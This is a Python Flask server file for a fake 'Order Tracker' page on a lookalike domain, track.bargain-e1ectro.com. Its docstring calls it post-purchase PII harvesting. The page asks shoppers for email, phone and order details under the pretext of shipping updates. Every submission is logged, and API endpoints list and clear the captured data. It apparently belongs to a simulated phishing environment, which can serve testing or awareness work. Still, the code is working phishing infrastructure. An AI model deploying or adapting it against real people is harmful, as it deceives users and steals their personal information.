"""Order Tracker — Post-purchase PII harvesting (port 10050, track.bargain-e1ectro.com).
Asks for email and phone 'to receive shipping updates'.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from flask import Flask, render_template, request, jsonify, redirect, url_for
from servers.utils import log_captured, load_log, save_log

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

app = Flask(
    __name__,
    template_folder=os.path.join(BASE_DIR, "templates", "order_tracker"),
    static_folder=os.path.join(BASE_DIR, "static"),
    static_url_path="/static",
)


@app.route("/")
def index():
    return redirect(url_for("track"))


@app.route("/track", methods=["GET", "POST"])
def track():
    if request.method == "POST":
        fields = request.form.to_dict()
        log_captured("order_tracker", 10050, "track.bargain-e1ectro.com", request, fields)
        return redirect(url_for("tracking_result", order_id=fields.get("order_id", "")))
    order_id = request.args.get("order_id", "")
    return render_template("track.html", order_id=order_id)


@app.route("/track/result")
def tracking_result():
    order_id = request.args.get("order_id", "")
    return render_template("success.html", order_id=order_id)


@app.route("/api/captured", methods=["POST"])
def captured():
    data = request.get_json(force=True, silent=True) or {}
    log_captured("order_tracker", 10050, "track.bargain-e1ectro.com", request, data)
    return jsonify({"status": "ok"})


@app.route("/api/captured", methods=["GET"])
def get_captured():
    return jsonify({"entries": load_log()})


@app.route("/api/clear", methods=["GET", "POST"])
def clear_captured():
    save_log([])
    return jsonify({"status": "ok"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10050, debug=False)
